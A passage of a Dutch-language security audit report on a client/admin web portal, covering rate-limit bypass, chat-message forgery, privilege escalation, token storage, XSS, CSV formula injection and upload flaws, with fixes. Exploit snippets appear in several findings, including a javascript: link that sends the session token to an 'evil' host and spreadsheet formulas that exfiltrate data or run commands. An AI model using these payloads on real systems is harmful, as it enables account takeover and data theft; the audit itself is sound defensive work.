  curl -X POST https://aimi-development.nl/… \
    -H "cf-connecting-ip: 1.2.3.$((RANDOM % 255))" -d '…'
done
```
Elke request krijgt een verse rate-limit-bucket. Daarmee vervallen alle limieten uit `server.ts:188-237`: 5 per 10 minuten op het contactformulier, 5 per uur op de website-checker, 30 per minuut algemeen. Ook `isIpBanned` wordt zinloos.

**Impact.** Alle rate limiting en alle IP-bans zijn te omzeilen. Dit is de enabler onder CRIT-01 (onbeperkt scannen), CRIT-03 (wachtwoord-brute-force) en MED-07 (e-mailbombing).

**Fix.** Vertrouw alleen headers van een bekende proxy:

```ts
// src/lib/rate-limit.ts
// Alleen een header vertrouwen als het verzoek aantoonbaar via onze eigen proxy
// komt. Zonder die zekerheid is elke header client-gestuurd en dus waardeloos
// als rate-limit-sleutel.
const TRUST_CF = process.env.TRUST_CF_CONNECTING_IP === "true";

export function getClientIp(request: Request): string {
  if (TRUST_CF) {
    const cfIp = request.headers.get("cf-connecting-ip");
    if (cfIp) return cfIp;
  }
  // Neem de LAATSTE entry: die is door onze eigen nginx toegevoegd. De eerste
  // is door de client te zetten.
  const xff = request.headers.get("x-forwarded-for");
  if (xff) {
    const parts = xff.split(",").map((p) => p.trim()).filter(Boolean);
    if (parts.length > 0) return parts[parts.length - 1];
  }
  return "unknown";
}
```

Dit werkt alleen samen met de juiste nginx-config in het serverblok:

```nginx
    # Verwijder client-gestuurde varianten voordat we onze eigen waarde zetten.
    proxy_set_header CF-Connecting-IP "";
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Real-IP $remote_addr;
```

Gebruik je wél Cloudflare, zet dan `set_real_ip_from` met de Cloudflare-ranges plus `real_ip_header CF-Connecting-IP`, en zet `TRUST_CF_CONNECTING_IP=true` in `.env`. Zonder Cloudflare: die variabele weglaten.

**Hersteltijd:** 45 minuten inclusief nginx.

---

#### HIGH-03 — Klant kan berichten van de admin in zijn eigen chat herschrijven

**Locatie:** `supabase/migrations/20260523221229_0bee5172-97fa-490f-8bd8-70dca65853cf.sql:59-63` (policy `messages update participants`)

**Probleem.** De UPDATE-policy op `chat_messages` heeft wel een `USING`-expressie maar geen `WITH CHECK`. De `USING`-clausule test op *chatlidmaatschap*, niet op *afzenderschap*. Bij een UPDATE valt `WITH CHECK` in PostgreSQL terug op `USING`, en die staat de wijziging toe zolang de rij in een chat zit waar de gebruiker lid van is.

**Exploitscenario.**
1. Klant opent zijn supportchat en noteert het `id` van een bericht van de admin.
2. In de browserconsole, met zijn eigen sessie:
   ```js
   await supabase.from("chat_messages")
     .update({ body: "Akkoord, u krijgt 50% korting.", sender_type: "admin" })
     .eq("id", "<id-van-adminbericht>");
   ```
3. De policy staat dit toe. Het bericht is voor beide partijen zichtbaar als afkomstig van de admin.

Hij kan ook `sender_id` en `sender_type` van zijn eigen berichten herschrijven en zo berichten fabriceren die van support lijken te komen.

**Impact.** Volledige integriteitsschending van het supportkanaal. Chatlogs zijn niet meer bruikbaar als bewijs bij een geschil, en een klant kan een toezegging fabriceren.

**Fix.**

```sql
-- Een deelnemer mag alleen zijn EIGEN berichten wijzigen en daarbij afzender
-- noch chat herschrijven. Zonder expliciete WITH CHECK valt Postgres terug op
-- USING, en die test lidmaatschap in plaats van afzenderschap.
DROP POLICY IF EXISTS "messages update participants" ON public.chat_messages;

CREATE POLICY "messages update own" ON public.chat_messages
  FOR UPDATE TO authenticated
  USING (sender_id = auth.uid())
  WITH CHECK (sender_id = auth.uid());
```

Loop daarna dezelfde constructie na bij de overige policies met `USING` zonder `WITH CHECK`: `users update own notifications` (`20260523183942:161`), `chats admin update` (`20260523221229:41`), `presence update own` (`:70`), `users update own change-attachments` op `storage.objects` (`20260523221752:28`). Alleen de eerste is exploiteerbaar — een klant kan titel en tekst van zijn eigen notificatie herschrijven, cosmetisch. De andere twee zijn veilig door terugval, maar horen expliciet gemaakt te worden.

**Hersteltijd:** 20 minuten.

---

#### HIGH-04 — `co_admin` kan wachtwoord en MFA van een `super_admin` overnemen

**Locatie:** `src/lib/admin.functions.ts:741` (`adminSetPassword`), `src/lib/telegram.functions.ts:73` (`adminSetMfaEnabled`), `:45` (`adminUnlinkTelegram`)

**Probleem.** Alle drie staan op `ensureAdmin`, wat `co_admin` insluit. Geen van drieën controleert de rol van het *doelwit*. Er is geen regel dat je alleen accounts met een gelijke of lagere rol mag aanraken.

**Exploitscenario.**
1. `co_admin` roept `adminSetPassword({ user_id: "<uuid-van-super_admin>", password: "Kies123!" })` aan.
2. Optioneel roept hij `adminUnlinkTelegram` of `adminSetMfaEnabled({enabled: false})` aan op datzelfde account, zodat er geen Telegram-melding komt.
3. Hij logt in als `super_admin` — via CRIT-03 zelfs zonder MFA-stap.
4. Hij heeft nu `manage_team`, `view_audit_log`, `delete_change_hard` en volledig rolbeheer.

`adminSetPassword` schrijft géén `audit_log`-regel, in tegenstelling tot blokkeren en rolwijzigingen. De escalatie laat dus geen spoor na op de plek waar je hem zou zoeken.

**Impact.** Verticale privilege-escalatie van `co_admin` naar `super_admin` in drie API-aanroepen. Het kortste pad naar volledige compromittering vanuit een bestaand staff-account.

**Fix.** Zet de drie functies op `ensureSuperAdmin` én voeg een doelwit-rolcheck toe:

```ts
// admin.functions.ts, in adminSetPassword vóór de wachtwoordwijziging
// Voorkom dat een lagere adminrol het wachtwoord van een hogere rol zet:
// dat is een direct escalatiepad naar super_admin.
const callerRoles = await ensureSuperAdmin(context.supabase, context.userId);
const targetRoles = await getRoles(context.supabase, data.user_id);
if (targetRoles.some((r) => SUPER_ADMIN_ROLES.includes(r as AppRole))
    && !callerRoles.some((r) => SUPER_ADMIN_ROLES.includes(r as AppRole))) {
  throw new Error("Forbidden: doelaccount heeft een hogere rol");
}
```

Voeg een audit-regel toe volgens het patroon dat al op regel 1213 staat:

```ts
await context.supabase.from("audit_log").insert({
  user_id: context.userId,
  action: "set_password",
  target_type: "user",
  target_id: data.user_id,
});
```

Doe hetzelfde voor `adminSetMfaEnabled` en `adminUnlinkTelegram` — die loggen al wel, maar staan op de verkeerde guard.

**Hersteltijd:** 1 uur.

---

#### HIGH-05 — Geen enkele route heeft een server-side autorisatiecheck

**Locatie:** `src/routes/_authenticated.tsx:13-30`, plus alle 13 onderliggende routes

**Probleem.** De `beforeLoad` van de authenticated-layout begint met `if (typeof window === "undefined") return;` (regel 14). De guard slaat zichzelf dus over tijdens SSR en draait uitsluitend in de browser. Hij controleert bovendien alleen óf er een sessie is, niet welke rol die heeft. Geen van de tien adminroutes heeft een eigen `beforeLoad` of `loader` met rolcheck; de afscherming zit volledig in de componenten via `usePermissions()`.

**Exploitscenario.** Een ingelogde klant navigeert naar `/admin/rollen`. Hij krijgt de volledige adminshell geserveerd. De data blijft leeg omdat de onderliggende server functions `Forbidden` gooien, en de component redirect hem daarna weg. Hij ziet de structuur van het adminportaal, de menuopbouw en alle labels — maar geen data.

**Impact.** Op dit moment lekt er geen data, omdat álle 96 admin-server-functions een `ensureX`-guard hebben. Dat is precies het probleem: er is één laag en geen tweede. Eén nieuwe server function waar de auteur `ensureAdmin` vergeet is direct volledig open. Bij 3976 regels admin-functions is dat een kwestie van tijd.

**Fix.** Voeg een server-side guard toe op de adminlayout:

```ts
// src/routes/_authenticated/admin.tsx
import { adminGetMyRoles } from "@/lib/admin.functions";
import { STAFF_ROLES, type AppRole } from "@/lib/rbac";
import { redirect } from "@tanstack/react-router";

export const Route = createFileRoute("/_authenticated/admin")({
  // Tweede laag naast de ensureX-guards in de server functions. Zonder deze
  // check rust alle autorisatie op één laag en is een vergeten guard in een
  // nieuwe server function meteen volledig open.
  beforeLoad: async () => {
    const roles = await adminGetMyRoles();
    if (!roles.some((r: string) => STAFF_ROLES.includes(r as AppRole))) {
      throw redirect({ to: "/portal" });
    }
  },
  component: AdminLayout,
});
```

Verwijder daarnaast de SSR-uitzondering in `_authenticated.tsx:14`, zodat de sessiecheck ook server-side loopt.

**Hersteltijd:** 2 uur, inclusief testen dat de redirects niet in een lus komen.

---

#### HIGH-06 — `is_staff_user()` en `is_project_member()` zijn `SECURITY DEFINER` zonder `search_path`

**Locatie:** `supabase/migrations/20260717130000_project_rls_baseline.sql:27-37` en `:39-49`

**Probleem.** Beide functies draaien met DEFINER-rechten maar hebben geen `SET search_path`, en verwijzen bovendien naar `user_roles` en `project_members` zonder schema-kwalificatie. Alle andere functies in de codebase hebben `SET search_path = public` wél — deze twee zijn de uitzondering. Dit is de klassieke search-path-hijack: wie `CREATE`-recht heeft op een schema dat vóór `public` in de search_path staat, kan daar een eigen `user_roles`-tabel plaatsen; `is_staff_user()` leest die dan en geeft altijd `true`.

**Exploitscenario.** Voorwaardelijk. `is_staff_user()` bewaakt de `_admin_write`-policies op `project_milestones`, `project_notes`, `project_contacts` en `project_activity_log`. Slaagt de hijack, dan kan een gewone klant al die tabellen lezen én schrijven, inclusief de interne notities die normaal achter `is_client_visible = true` zitten.

Of dit exploiteerbaar is hangt af van of `authenticated` `CREATE`-recht heeft op `public`. In recente Supabase-projecten is dat ingetrokken, in oudere niet. **Handmatig verifiëren:**
```sql
SELECT has_schema_privilege('authenticated', 'public', 'CREATE');
```

**Impact.** Geeft die query `true`, dan is het een volledige doorbraak van de projecten-RLS door elke ingelogde klant. Zo niet, dan geen directe impact, maar het blijft een afwijking van het patroon dat de rest van de codebase wél volgt.

**Fix** — ongeacht de uitkomst van de verificatie:

```sql
CREATE OR REPLACE FUNCTION public.is_staff_user()
RETURNS boolean
LANGUAGE sql STABLE SECURITY DEFINER
SET search_path = public          -- ontbrak: zonder dit is de functie hijackbaar
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles ur   -- expliciet schema-gekwalificeerd
    WHERE ur.user_id = auth.uid()
      AND ur.role IN ('super_admin','co_admin','support_agent','viewer','admin','sales')
  );
$$;

CREATE OR REPLACE FUNCTION public.is_project_member(p_project_id uuid)
RETURNS boolean
LANGUAGE sql STABLE SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.project_members pm
    WHERE pm.project_id = p_project_id AND pm.user_id = auth.uid()
  );
$$;
```

Neem de exacte rollijst over uit de bestaande definitie op `20260717130000:27-37` — de lijst hierboven is een reconstructie en moet vóór toepassing geverifieerd worden.

**Hersteltijd:** 30 minuten.

---

#### HIGH-07 — Read-only rol `viewer` kan zes schrijfacties uitvoeren

**Locatie:** `src/lib/rbac.ts:40` (`STAFF_GUARD_ROLES` bevat `viewer`), toegepast op zes mutaties

**Probleem.** `ensureStaff` laat `viewer` toe. In `role_permissions` staat `viewer` overal op `false` behalve lezen (`20260714100000:74-89`), maar zes schrijvende server functions gebruiken `ensureStaff` in plaats van `ensureAdmin` en handhaven de matrix niet:

| Functie | Locatie | Wat `viewer` kan |
|---|---|---|
| `adminMarkPasswordResetHandled` | `admin.functions.ts:1417` | Wachtwoordreset-verzoek als afgehandeld markeren |
| `adminCreateProjectTimeEntry` | `admin.functions.ts:2347` | Uren boeken op een **vrij te kiezen `user_id`** |
| `adminSyncCustomerMonitoring` | `admin.functions.ts:2891` | Monitoring-sync forceren (netwerk-IO) |
| `adminSnoozeAlert` | `admin.functions.ts:3113` | Alerts wegdrukken |
| `adminMarkAlertSeen` | `admin.functions.ts:3129` | Alerts als gezien markeren |
| `adminToggleContactHandled` | `contact.functions.ts:86` | Contactverzoeken als afgehandeld markeren |

Op databaseniveau is het breder: de `staff manage`-policies op `project_tasks`, `project_task_time_entries`, `project_milestone_dependencies`, `project_templates` en `project_template_milestones` zijn `FOR ALL` met een OR-keten die `viewer` insluit (`20260717130000:158-214`). Daar heeft `viewer` rechtstreeks INSERT/UPDATE/DELETE, ook buiten de server functions om.

**Exploitscenario.** Een `viewer`-account — typisch uitgedeeld aan een stagiair of externe boekhouder — drukt alle monitoring-alerts weg, waardoor een echte storing onopgemerkt blijft. Of hij boekt uren op naam van een collega, wat direct in de facturatie doorwerkt. Of hij markeert een openstaand wachtwoordreset-verzoek als afgehandeld, waardoor een klant zonder toegang blijft zitten.

**Impact.** De read-only rol is niet read-only. Voor een rol die je juist uitdeelt aan mensen die je niet volledig vertrouwt, is dat een wezenlijk probleem.

**Fix, twee delen.**

*Applaag* — voor de vier die echt admin-werk zijn (`adminMarkPasswordResetHandled`, `adminCreateProjectTimeEntry`, `adminSyncCustomerMonitoring`, `adminToggleContactHandled`) volstaat `ensureAdmin`. Voor de twee alert-functies is `support_agent` legitiem; introduceer daarvoor een aparte set:

```ts
// src/lib/rbac.ts
// Staff die mág schrijven. STAFF_GUARD_ROLES bevat viewer en is bedoeld voor
// lezen; die rol hoort geen mutaties te kunnen doen.
export const STAFF_WRITE_ROLES: AppRole[] = ["super_admin", "co_admin", "support_agent", "admin"];
```
```ts
// src/lib/auth-guards.server.ts
export async function ensureStaffWrite(supabase: any, userId: string): Promise<string[]> {
  return ensureRoles(supabase, userId, STAFF_WRITE_ROLES, "staff write only");
}
```

*Databaselaag* — splits de `FOR ALL`-policies in lezen en schrijven:

```sql
-- viewer hoort te lezen, niet te schrijven. De FOR ALL-policy gaf hem volledige
-- write op taken, tijdregistratie en sjablonen.
DROP POLICY IF EXISTS "staff manage project_tasks" ON public.project_tasks;

CREATE POLICY "staff read project_tasks" ON public.project_tasks
  FOR SELECT USING (public.is_staff_user());

CREATE POLICY "staff write project_tasks" ON public.project_tasks
  FOR ALL
  USING (public.has_any_role(auth.uid(),
    ARRAY['super_admin','co_admin','support_agent','admin']::public.app_role[]))
  WITH CHECK (public.has_any_role(auth.uid(),
    ARRAY['super_admin','co_admin','support_agent','admin']::public.app_role[]));
```
Herhaal voor `project_task_time_entries`, `project_milestone_dependencies`, `project_templates` en `project_template_milestones`.

**Hersteltijd:** 2 uur.

---

#### HIGH-08 — Sessietokens staan plaintext en permanent in `telegram_pending_logins`

**Locatie:** `src/lib/telegram.functions.ts:268-274`; schema `supabase-telegram-migration.sql:62-72`

**Probleem.** Tussen de wachtwoordstap en de MFA-stap worden het volledige `access_token` en `refresh_token` onversleuteld in Postgres gezet. Er is een `expires_at` van 5 minuten en `used_at` wordt gezet na gebruik, maar **er is geen enkele cleanup-job voor deze tabel**. Rijen blijven permanent staan; de enige pg_cron-job in het project ruimt `website_checks` op. Bij elke login van een MFA-account groeit de tabel dus met één rij die een werkende refresh-token bevat, en refresh-tokens verlopen niet vanzelf zolang ze niet gebruikt of ingetrokken zijn.

**Exploitscenario.** Iedereen die de service-role-key bemachtigt of een databasedump in handen krijgt, heeft direct bruikbare sessies voor elk MFA-account dat ooit heeft ingelogd — inclusief admins. Hij hoeft geen wachtwoord te kennen en geen MFA te passeren; hij wisselt de refresh-token gewoon in.

Twee aanvullende problemen in dezelfde flow. `verifyMfaCode` (`telegram.server.ts:277-282`) doet een read-modify-write op `attempts` zonder atomaire increment, dus parallelle requests omzeilen de limiet van 5 pogingen. En `loginResendMfa` maakt een nieuwe rij met `attempts: 0` terwijl `verifyMfaCode` altijd de nieuwste pakt — resend is daarmee een gratis reset van de teller.

**Impact.** Een tabel vol permanent geldige sessietokens vergroot de schade van elk ander lek aanzienlijk: het maakt van een service-role-lek een directe accountovername van alle admins.

**Fix, drie delen.**

1. *Sla de tokens niet op.* Lost CRIT-03 op met Supabase's eigen MFA, dan verdwijnt deze tabel volledig.

2. *Zolang de tabel bestaat: opruimen.*
```sql
-- Gebruikte en verlopen pending-logins bevatten werkende refresh-tokens en
-- horen niet te blijven staan.
CREATE OR REPLACE FUNCTION public.cleanup_telegram_transient()
RETURNS void
LANGUAGE sql SECURITY DEFINER SET search_path = public
AS $$
  DELETE FROM public.telegram_pending_logins
    WHERE used_at IS NOT NULL OR expires_at < now();
  DELETE FROM public.telegram_mfa_codes   WHERE expires_at < now() - interval '1 hour';
  DELETE FROM public.telegram_link_tokens WHERE expires_at < now() - interval '1 hour';
$$;

REVOKE EXECUTE ON FUNCTION public.cleanup_telegram_transient() FROM PUBLIC, anon, authenticated;

SELECT cron.schedule('cleanup-telegram-transient', '*/15 * * * *',
  $$SELECT public.cleanup_telegram_transient();$$);
```
Wis daarnaast eenmalig de bestaande inhoud: `DELETE FROM public.telegram_pending_logins;`

3. *Maak de pogingenteller atomair.* Vervang de read-modify-write in `telegram.server.ts:277-282` door een `UPDATE … SET attempts = attempts + 1 … RETURNING attempts` en beoordeel de teruggegeven waarde. Zet bovendien `used_at` op de oude pending-login zodra `generateAndSendMfaCode` een nieuwe aanmaakt.

**Hersteltijd:** 3 uur.

---

#### HIGH-09 — Rauwe Postgres-foutmeldingen worden aan de eindgebruiker getoond

**Locatie:** ruim 40 plekken, o.a. `portal.functions.ts:119, 134, 186, 198, 223, 310, 412, 443, 458, 533, 552, 564, 589, 607, 666, 680, 688, 707`; `accounts.functions.ts:85, 110, 131, 203, 237, 251, 265`; `telegram.functions.ts:62, 97, 121, 138, 163, 189, 204`; `admin.server.ts:88, 99, 105`

**Probleem.** Het patroon `throw new Error(error.message)` geeft de PostgREST-foutmelding letterlijk door. TanStack Start serialiseert de `message` van een server-function-error naar de client, en de UI toont hem rechtstreeks: `_authenticated.tsx:158` doet `toast.error(e.message)`, evenals `account.tsx:91` en `TelegramMfaCard.tsx:48,54,60`.

Die berichten bevatten tabelnamen, kolomnamen, constraint-namen en RLS-policy-namen, bijvoorbeeld `new row violates row-level security policy for table "change_requests"` of `duplicate key value violates unique constraint "idx_leads_unique"`.

**Exploitscenario.** Een aanvaller doet gerichte, bewust mislukkende requests en leest uit de foutmeldingen het volledige databaseschema af: welke tabellen bestaan, hoe kolommen heten, welke constraints er zijn, welke RLS-policies aanslaan. Dat is precies de verkenning die aan een gerichte aanval voorafgaat.

**Impact.** Informatielek dat elke andere aanval goedkoper maakt. Geen directe compromittering.

**Fix.** Introduceer één helper en gebruik die overal:

```ts
// src/lib/errors.server.ts
/** Log het echte probleem server-side, geef de client een neutrale melding.
 *  Rauwe PostgREST-messages lekken tabel-, kolom- en policy-namen. */
export function dbError(error: { message: string; code?: string }, context: string): never {
  console.error(`[db] ${context}:`, error.message, error.code ?? "");
  throw new Error("Er ging iets mis bij het opslaan. Probeer het opnieuw.");
}
```

```ts
// was:  if (error) throw new Error(error.message);
// wordt: if (error) dbError(error, "updateMyProfile");
```

Doe dit stapsgewijs, te beginnen bij `portal.functions.ts` — dat is het oppervlak waar niet-vertrouwde gebruikers bij kunnen. De admin-functies zijn lager geprioriteerd omdat daar alleen staff komt.

**Hersteltijd:** 3 uur voor alles; 45 minuten voor alleen `portal.functions.ts`.

---
### MEDIUM

---

#### MED-01 — `javascript:`-URL's uit klantinvoer landen in `<a href>` van het adminportaal

**Locatie:** `src/routes/_authenticated/portal.tsx:906-907` en `:952`; `src/routes/_authenticated/admin.projecten.$projectId.tsx:202`; `portal.tsx:1271`; `portal.projecten.$projectId.tsx:211`

**Probleem.** Twee paden waarlangs een door de klant getypte string ongefilterd als `href` wordt gerenderd:

1. `portal.tsx:906-907` haalt met `desc.match(/(?:🌐\s*)?Website:\s*(\S+)/)` een URL uit de **door de klant zelf ingetypte omschrijving** van een wijzigingsverzoek. `\S+` accepteert elk schema.
2. `profiles.website_url` wordt gevalideerd met `z.string().trim().max(500)` — **zonder `.url()`** (`admin.functions.ts:119, 1462, 1544, 2630`; `portal.functions.ts:151`). De klant zet dit veld zelf via de onboarding (`OnboardingWizard.tsx:347`). Het wordt daarna als klikbare link in het adminportaal getoond.

**Exploitscenario.** Klant vult als website in: `javascript:fetch('https://evil/'+localStorage.getItem('sb-<ref>-auth-token'))`. Een admin opent het klantdetail en klikt op de link. De code draait op de portal-origin met de sessie van de admin. Omdat het token in localStorage staat (zie INFO-01), is dat een volledige overname van een adminaccount. `rel="noopener"` en `target="_blank"` beschermen hier niet tegen, en de CSP staat `script-src 'unsafe-inline'` toe (`server.ts:120`), dus die vangt het ook niet af.

**Impact.** Stored XSS met een admin als doelwit, geleverd door een gewone klant. Vereist wel een klik.

**Fix.** Eén helper, overal gebruiken:

```ts
// src/lib/utils.ts
/** Geeft alleen http(s)-URL's terug. Zonder schema-allowlist kan een door de
 *  klant ingetypte "website" een javascript:-URL zijn die in de admin-origin draait. */
export function safeExternalUrl(raw: string | null | undefined): string | null {
  if (!raw) return null;
  const candidate = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`;
  try {
    const u = new URL(candidate);
    return u.protocol === "http:" || u.protocol === "https:" ? u.toString() : null;
  } catch {
    return null;
  }
}
```

```tsx
// Gebruik op alle vier de plekken:
const href = safeExternalUrl(linkUrl);
{href && <a href={href} target="_blank" rel="noopener noreferrer">{linkUrl}</a>}
```

Voeg daarnaast `.url()`-validatie toe aan de `website_url`-schema's, zodat de waarde al bij opslag geweigerd wordt.

**Hersteltijd:** 45 minuten.

---

#### MED-02 — CSV-export is kwetsbaar voor formule-injectie

**Locatie:** `src/components/LeadsPanel.tsx:131`; `src/lib/admin.functions.ts:2398-2402` (`csvEscape`), gebruikt op `:2435-2443`

**Probleem.** Beide escape-functies doen alleen quote-verdubbeling. Een cel die begint met `=`, `+`, `-`, `@`, tab of carriage return wordt door Excel en LibreOffice als formule geïnterpreteerd. `csvEscape` quoteert bovendien alleen bij `[",\n]` — `\r` en tab zitten niet eens in de trigger.

De bronvelden zijn user-controlled: `i.description` (vrije tekst uit tijdregistratie), `full_name`, en bij leads de volledige geïmporteerde CSV-inhoud (`LeadsPanel.tsx:336-337`, geparsed via `parseLeadsCsv`, dat cellen alleen trimt en afkapt — `csv.ts:155-160`).

**Exploitscenario.** Een lead-import bevat in `company_name` de waarde `=HYPERLINK("https://evil/?d="&A1&B1,"Klik voor factuur")`. Een medewerker exporteert de leadlijst en opent hem in Excel. De formule wordt actief en lekt bij een klik de inhoud van naburige cellen naar een externe server. Varianten met `=cmd|'/c calc'!A0` kunnen in oudere Excel-configuraties commando-uitvoering triggeren (DDE).

**Impact.** Data-exfiltratie of code-uitvoering op de werkplek van een medewerker, geleverd via data die de organisatie zelf importeert.

**Fix.** In beide bestanden, vóór het quoten:

```ts
/** Neutraliseer cellen die Excel/LibreOffice als formule zou interpreteren.
 *  Quoting alleen is niet genoeg: de spreadsheet kijkt naar het eerste teken
 *  ná het uitpakken van de quotes. */
function csvSafe(value: unknown): string {
  const s = String(value ?? "");
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
}

// LeadsPanel.tsx:131
const esc = (v: unknown) => `"${csvSafe(v).replace(/"/g, '""')}"`;

// admin.functions.ts:2398 — trigger uitbreiden met \r en tab
function csvEscape(value: unknown): string {
  const s = csvSafe(value);
  return /[",\n\r\t]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
```

**Hersteltijd:** 20 minuten.

---

#### MED-03 — `file_path` van een bijlage wordt niet tegen de eigen storage-prefix gevalideerd

**Locatie:** `src/lib/portal.functions.ts:340-351` en `:421-429` (`submitChangeRequest`), in combinatie met `:517-535` (`getAttachmentUrl`)

**Probleem.** `submitChangeRequest` accepteert `file_path` als vrije string en schrijft die in `change_attachments` met `user_id: userId`. Er is geen check dat het pad in de eigen storage-prefix ligt. `getAttachmentUrl` doet daarna een ownership-check met `.eq("file_path", …).eq("user_id", userId)` — maar die check is zelf-vervullend, want de aanvaller heeft de rij zelf met zijn eigen `user_id` aangemaakt.

**Exploitscenario.** Klant A raadt of achterhaalt het pad `<uuid-van-B>/factuur.pdf`. Hij dient een wijzigingsverzoek in met dat pad als bijlage. De rij landt in `change_attachments` met zijn eigen `user_id`. Vervolgens roept hij `getAttachmentUrl` aan; de ownership-check slaagt.

**Wat de aanval nu tegenhoudt:** de daadwerkelijke `createSignedUrl` gaat via de user-client (`portal.functions.ts:530`), dus storage-RLS geldt alsnog, en de policy `users read own change attachments` (`20260523190624:161-167`) eist dat het eerste padsegment de eigen UUID is. De aanval faalt daarop. De feitelijke bescherming ligt dus volledig bij storage-RLS, terwijl de code doet alsof de applicatiecheck iets waarborgt.

**Impact.** Op dit moment niet exploiteerbaar. Wel een latente bug: zodra iemand `getAttachmentUrl` naar `supabaseAdmin` omzet — een voor de hand liggende "optimalisatie" — is het meteen een volledige IDOR op alle klantbijlagen.

**Fix.** Valideer bij insert:

```ts
// portal.functions.ts, in submitChangeRequest vóór de attachment-insert
// De ownership-check in getAttachmentUrl is zelf-vervullend zolang de klant
// het pad zelf kiest; de echte grens hoort hier te liggen.
for (const att of attachments) {
  if (!att.file_path.startsWith(`${userId}/`)) {
    throw new Error("Ongeldig bijlagepad.");
  }
}
```

**Hersteltijd:** 15 minuten.

---

#### MED-04 — Upload-restricties zijn alleen client-side

**Locatie:** `src/routes/_authenticated/portal.tsx:287-300`; bucketdefinities `20260523190624:158` en `20260523221229:74-76`

**Probleem.** De MIME-allowlist (`ALLOWED_ATTACHMENT_MIME`) en de 10 MB-limiet staan uitsluitend in de React-component. De upload gaat rechtstreeks vanuit de browser naar Supabase Storage, dus de server ziet het bestand nooit en kan niets hercontroleren. Op de buckets zijn in geen enkele migratie `allowed_mime_types` of `file_size_limit` gezet.

**Exploitscenario.** Een klant roept `supabase.storage.from("change-attachments").upload(...)` direct aan met een bestand van 2 GB, of met een `.svg` of `.html`. De storage-policy controleert alleen het eerste padsegment. Grootte: schijfvulling en kosten. Bestandstype: een SVG met een `<script>` erin wordt via de signed URL geopend in een nieuw tabblad (`portal.tsx:331-334`) — dat rendert op de `*.supabase.co`-origin, niet op de app-origin, dus geen sessiediefstal, maar wel een phishing-pagina onder een URL die er legitiem uitziet.

**Impact.** Ongelimiteerde opslaggroei per account, en een gehoste-inhoud-vector voor phishing.

**Fix.** Zet de grenzen op de bucket zelf, waar ze niet te omzeilen zijn:

```sql
-- Client-side checks in portal.tsx zijn te omzeilen: de upload gaat direct
-- van browser naar Storage. De bucket is de enige plek waar dit hard is.
UPDATE storage.buckets
SET file_size_limit = 10485760,   -- 10 MB
    allowed_mime_types = ARRAY[
      'image/png','image/jpeg','image/gif','image/webp','application/pdf'
    ]
WHERE id IN ('change-attachments','chat-attachments');
```

**Hersteltijd:** 15 minuten.

---

#### MED-05 — Onboarding-stappen zijn over te slaan en `onboarding_self_enabled` wordt genegeerd

**Locatie:** `src/lib/portal.functions.ts:138-187` (`portalSaveOnboardingStep`), `:189-199` (`portalCompleteOnboarding`)

**Probleem.** `portalSaveOnboardingStep` valideert `step` alleen als `0..5` en schrijft die rechtstreeks weg (regel 178) — er is geen controle dat de vorige stap voltooid is. `portalCompleteOnboarding` zet `onboarding_status: "completed"` zonder enige validatie: geen check op verplichte velden, geen check op `onboarding_step`, en geen check op de vlag `onboarding_self_enabled`. Die vlag wordt uitsluitend client-side afgedwongen (`portal.tsx:727`).

**Exploitscenario.** Een admin zet zelf-onboarding uit voor een klant omdat de gegevens handmatig gecontroleerd moeten worden. De klant roept via de console `portalCompleteOnboarding()` aan en staat direct op "voltooid", met een leeg profiel. De admin ziet een afgeronde onboarding en gaat ervan uit dat de gegevens kloppen.

**Impact.** Geen privilege-escalatie — onboarding raakt `user_roles` niet, en de Zod-whitelist bevat geen gevoelige velden. Wel een doorbreking van de bedoelde workflow en van de data-integriteit.

**Fix.**

```ts
// portal.functions.ts, in portalCompleteOnboarding vóór de update
// De self-onboarding-toggle werd alleen in de UI gerespecteerd; de serverfn
// negeerde hem volledig.
const { data: p } = await context.supabase
  .from("profiles")
  .select("onboarding_self_enabled, onboarding_step, company, phone")
  .eq("id", context.userId)
  .maybeSingle();

if (!p?.onboarding_self_enabled) {
  throw new Error("Forbidden: zelf-onboarding staat uit voor dit account");
}
if ((p.onboarding_step ?? 0) < 5 || !p.company || !p.phone) {
  throw new Error("Onboarding is nog niet volledig ingevuld.");
}
```

Pas hetzelfde toe in `portalSaveOnboardingStep`: weiger een `step` die meer dan één hoger is dan de opgeslagen waarde.

**Hersteltijd:** 45 minuten.

---

#### MED-06 — Geen poortrestrictie op de Website Checker

**Locatie:** `src/lib/website-checker.server.ts:136-198` (`fetchSafely`)

**Probleem.** Er is nergens een beperking op de doelpoort. `http://voorbeeld.nl:22/`, `:5432`, `:6379`, `:3000` en `:3002` worden allemaal geprobeerd. Undici blokkeert wel een handvol "bad ports" uit de Fetch-standaard (dat verklaart de `bad port`-fout op poort 9 in de test bij CRIT-01), maar 22, 3000, 3002, 5432 en 6379 zitten daar niet bij.

**Exploitscenario.** Zonder CRIT-01 is dit al bruikbaar tegen externe hosts: een aanvaller laat de server poorten scannen op een willekeurig doeladres en leest het resultaat af aan de bereikbaarheidscheck en de responstijd. De verzoeken komen van het IP van de VPS, dus de scan is geanonimiseerd. Samen met CRIT-01 richt hij dezelfde scan op het interne netwerk.

**Impact.** De tool is bruikbaar als anonieme portscanner. Reputatieschade voor het server-IP en mogelijke abuse-klachten bij Hetzner.

**Fix.** De `ALLOWED_PORTS`-check zit al in de voorgestelde `assertSafeTarget` bij CRIT-01 en wordt daarmee in één keer opgelost. Los toepassen kan ook:

```ts
// Beperk tot de poorten waarop een publieke website daadwerkelijk draait.
// Zonder deze check is de tool een portscanner die vanaf ons IP verkeer stuurt.
const ALLOWED_PORTS = new Set(["", "80", "443", "8080", "8443"]);
if (!ALLOWED_PORTS.has(current.port)) {
  throw new SsrfBlockedError(current.hostname);
}
```

**Hersteltijd:** 10 minuten (samen met CRIT-01).

---

#### MED-07 — Contactformulier is bruikbaar voor spam en e-mailbombing

**Locatie:** `src/lib/contact.functions.ts:7-70`; policy `20260523230242:14-22`; rate limit `server.ts:208-216`

